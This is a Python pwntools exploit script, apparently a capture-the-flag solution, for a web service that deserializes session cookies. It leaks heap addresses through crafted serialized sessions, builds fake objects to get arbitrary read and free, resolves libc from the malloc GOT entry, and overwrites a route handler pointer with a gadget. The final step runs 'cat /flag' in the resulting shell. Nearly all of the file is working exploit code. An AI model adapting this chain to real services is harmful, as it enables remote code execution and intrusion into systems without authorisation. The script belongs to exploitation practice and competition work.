#!/usr/local/bin/python
import sys
from pwn import *

offsets = [
        [0x71710, 0x63d070, 0x4f322], # debug
        ][0]

def build_req(method='GET', path='/', data='', **kwargs):
    raw = '''%s %s HTTP/1.1\r\n''' % (method, path)
    data += '&'.join('%s=%s' % (k, v) for k, v in kwargs.iteritems())
    raw += 'Content-Length: %d\r\n' % (len(data))
    raw += 'Connection: keep-alive\r\n'
    # raw += 'HTTP_RUST_BACKTRACE: full\r\n'
    raw += '\r\n'
    raw += data
    return raw

def recv_http(r):
    d = r.recvuntil('Content-Length: ')
    l = r.recvuntil('\r\n')
    n = int(l.strip())
    d += l
    while not d.endswith('\r\n\r\n'):
        d += r.recvn(1)
    d += r.recvn(n)
    print d
    return d

b64 = lambda s: s.encode('base64').replace('\n', '')

def parse_cookie(d):
    return d.split('session=')[1].split(';')[0].decode('base64')

def leak_text():
    r.send(build_req('POST', '/enroll', session=b64('s:18446744073709551611:"";'), label=1, secret=2))


def exploit(host, port):
    def leak_heap():
        r = remote(host, port)
        r.send(build_req('POST', '/enroll', session=b64('a:1:{r:2;r:5;}'),
            label='X' * 64, secret='B' * 56))
        session = parse_cookie(recv_http(r))
        print session
        print hexdump(session.split('"')[-2])
        r.close()
        return u64(session.split('"')[-2][8:16])

    def fake_obj1(r, obj):
        # Ref(3) is freed, filled by `label`, all keys are freed before values
        # `label` is freed *before* freeing the fake object
        r.send(build_req('POST', '/enroll', session=b64('a:5:{i:0;r:3;i:1;a:0:{}i:2;i:2;i:3;i:3;i:4;i:4;}'),
            secret='X', label=str(obj)))
        session = parse_cookie(recv_http(r))
        # print session
        # print hexdump(session.split(';')[1])
        return session

    def fake_obj2(r, obj):
        # Ref(3) is freed, filled by `label`, all keys are freed before values
        # `label` is freed *after* freeing the fake object
        r.send(build_req('POST', '/enroll', session=b64('a:5:{r:3;i:1;i:1;a:0:{}i:2;i:2;i:3;i:3;i:4;i:4;}'),
            secret='X', label=str(obj)))
        session = parse_cookie(recv_http(r))
        # print session
        # print hexdump(session.split(';')[0].split('{')[1])
        return session

    def read(r, addr, length):
        d = fake_obj1(r, ''.join(map(p64, [0x4, addr, length, length, 0, 0, 0])))
        return d.split('"')[1]

    def dealloc(r, addr, length):
        d = fake_obj2(r, ''.join(map(p64, [0x4, addr, length, length, 0, 0, 0])))
        return d.split('"')[1]

    def read_once(addr, length):
        r = remote(host, port)
        d = read(r, addr, length)
        r.close()
        return d

    ptr = leak_heap()
    print 'heap ptr', hex(ptr)
    heap_base = ptr - 0x13e00
    print 'heap base', hex(heap_base)
    vec_routes_addr = heap_base + 0xefd0
    vec_routes_size = 0x58 * 8
    vec_routes = read_once(vec_routes_addr, vec_routes_size) # free
    print hexdump(vec_routes)
    # fake_obj1(''.join(map(p64, [0x4, 0x563d54e23490, 0x100, 0x100, 0, 0, 0])))
    # print hexdump(read(0x563d535fe000, 0x100))
    vec_routes = bytearray(vec_routes)
    index_func = u64(vec_routes[0x50:0x58])
    print 'app::index', hex(index_func)
    text_base = index_func - offsets[0] # debug
    print 'babi base', hex(text_base)
    malloc_got = text_base + offsets[1] # debug
    malloc = u64(read_once(malloc_got, 8))
    print 'malloc', hex(malloc)
    libc_base = malloc - 0x97070
    print 'libc', hex(libc_base)
    magic = libc_base + offsets[2] # debug
    print 'magic', hex(magic)
    # raw_input('go')
    vec_routes[0x50:0x58] = p64(magic)
    r = remote(host, port)
    dealloc(r, vec_routes_addr, vec_routes_size)
    r.send(build_req('GET', '/', data=str(vec_routes)))
    r.sendline('cat /flag;exit')
    print r.recvall()
    # r.interactive()

if __name__ == '__main__':
    for i in xrange(3):
        try:
            exploit(sys.argv[1], int(sys.argv[2]))
            sys.exit(0)
        except Exception as e:
            print e
